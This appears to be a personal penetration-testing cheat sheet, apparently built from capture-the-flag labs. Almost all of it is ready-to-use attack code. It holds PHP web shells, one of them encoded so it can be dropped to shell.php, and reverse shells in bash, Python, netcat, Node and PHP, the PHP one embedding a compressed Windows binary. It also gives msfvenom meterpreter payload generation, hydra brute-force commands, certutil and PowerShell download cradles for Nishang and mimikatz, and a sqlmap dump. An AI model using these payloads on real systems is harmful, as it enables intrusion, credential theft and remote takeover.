# Tips and Tricks

Just various bits of script and techniques I've found useful.

## Web shells

PHP one liner:

`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`

Tighter: 

`<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`

PHP interactive shell:

```
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<script>document.getElementById("cmd").focus();</script>
```

shell above emitted to a file via base64:

```
echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49%47%35%68%62%57%55%39%49%6a%77%2f%63%47%68%77%49%47%56%6a%61%47%38%67%59%6d%46%7a%5a%57%35%68%62%57%55%6f%4a%46%39%54%52%56%4a%57%52%56%4a%62%4a%31%42%49%55%46%39%54%52%55%78%47%4a%31%30%70%4f%79%41%2f%50%69%49%2b%43%6a%78%70%62%6e%42%31%64%43%42%30%65%58%42%6c%50%53%4a%55%52%56%68%55%49%69%42%75%59%57%31%6c%50%53%4a%6a%62%57%51%69%49%47%6c%6b%50%53%4a%6a%62%57%51%69%49%48%4e%70%65%6d%55%39%49%6a%67%77%49%6a%34%4b%50%47%6c%75%63%48%56%30%49%48%52%35%63%47%55%39%49%6c%4e%56%51%6b%31%4a%56%43%49%67%64%6d%46%73%64%57%55%39%49%6b%56%34%5a%57%4e%31%64%47%55%69%50%67%6f%38%4c%32%5a%76%63%6d%30%2b%43%6a%78%77%63%6d%55%2b%43%6a%77%2f%63%47%68%77%43%69%41%67%49%43%42%70%5a%69%68%70%63%33%4e%6c%64%43%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%51%6f%67%49%43%41%67%65%77%6f%67%49%43%41%67%49%43%41%67%49%48%4e%35%63%33%52%6c%62%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4f%77%6f%67%49%43%41%67%66%51%6f%2f%50%67%6f%38%4c%33%42%79%5a%54%34%4b%50%48%4e%6a%63%6d%6c%77%64%44%35%6b%62%32%4e%31%62%57%56%75%64%43%35%6e%5a%58%52%46%62%47%56%74%5a%57%35%30%51%6e%6c%4a%5a%43%67%69%59%32%31%6b%49%69%6b%75%5a%6d%39%6a%64%58%4d%6f%4b%54%73%38%4c%33%4e%6a%63%6d%6c%77%64%44%34%3d | base64 -d > shell.php
```

## Reverse shells

Bash (almost never works in my experience):

`bash -i >& /dev/tcp/10.4.0.7/4444 0>&1`

Python (almost always works in my experience):

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Netcat when you dont have the -e option (this actually worked once when the others didnt!):

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f`

Node reverse shell, if you can get this included on a nodejs server:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.4.0.7", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

PHP reverse shell on windows:

```php
$ip   = "10.4.0.7";
$port = "4444";
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, "wb");
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
```

## shell tricks

making a bad reverse shell better:

`python -c 'import pty; pty.spawn("/bin/bash")'`

bypassing url encoding if doing something sneaky like get[cmd]:

`echo urlencoded | base64 -d > shell.php`

creating a windows exe that will call home:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.100.16 LPORT=4443 -f exe -o callhome.exe`

## Brute forcing with hydra and cewl

CeWL generates a wordlist from a page. `cewl 192.168.154.10 > words.txt` will create a mini list, which was useful in one challenge based on bruteforcing with this list.

For hydra, `-l` specifies a username, `-L` a username source file, `-p` a password and `-P` a password list

SSH or FTP (swap the last bit by protocol):

`hydra -L users.txt -P passwords.txt 192.168.154.10 ssh`

Regular login form (for wordpress dont do this, just use wp-scan with the -U, -P options):

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`

The below targets an aspx page, that needed viewstate to go with it in order to get the error message back:

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.aspx:__VIEWSTATE=pIru3H%2F3LYg1qp3lNSwHX1ALuENNV6tddZ32Zp4xRIs57ec4jlYH9sp8EHtZ0sp66EsCaToBXZLEbw62lNBT7XuKpv84ZHetBU3stATD5DYczl9JagBTENtoK%2B6lyNFyDsrRWb34%2F9jXclG%2FsQWa1tJXjQAYZJP2MJNhNaH2WMIL%2FQf9&__EVENTVALIDATION=lQWGlUQ0Fmhz%2BuiWoqOKaexWGfGTltskH%2FV3RsXfmd%2B8N5m8JCLGWXUm7pFZQj0G0QjJMd3MLudMx0zUAlot%2BanlZVtlggDnm3e%2B2DNiDwnhrETOWRZdwtNypSULvwzs8ZlD1SiHFFPASQz1PJN12l5Fi3uL4UCohXb%2BBjCo1nU5Sz7I&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`

## downloading files from the windows command prompt

without the use of powershell or anything clever. great for pulling files off my attacker machine

```
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome.exe" callhome.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome2.exe" callhome2.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/winPEAS.bat" winPEAS.bat
```

with powershell (first also invokes a script, in this case Invoke-PowerShellTcp from Nishang):

`println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.100.16:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.100.16 -Port 4444".execute().text`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.139.149:8000/callhome.exe','callhome.exe')"`

or more simply, in powershell:

`Invoke-WebRequest -Uri $url -OutFile $output`

using python (if you have it):

`c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.50.123:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip`

## cracking zips

apart from zip2john and john, there is also `fcrackzip -b --method 2 -D -p rockyou.txt -v extracted.zip`

## Injections

Raw sqlmap will go through all its tests, which might take ages. If you know the test to use, then you can actually specify it in the sqlmap command.

`sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --test-filter="MySQL >= 5.0 error-based - Parameter replace (FLOOR)" --random-agent --dump -p list[fullordering]`

In the above, exploiting https://www.exploit-db.com/exploits/42033, I know the param and the test that will work, so I specify both and jump straight to the dumping.

If able to inject some python script, e.g. into unsanitised input, this can work:

`__import__('os').popen('nc 10.10.106.5 4444 -e /bin/sh').read()`
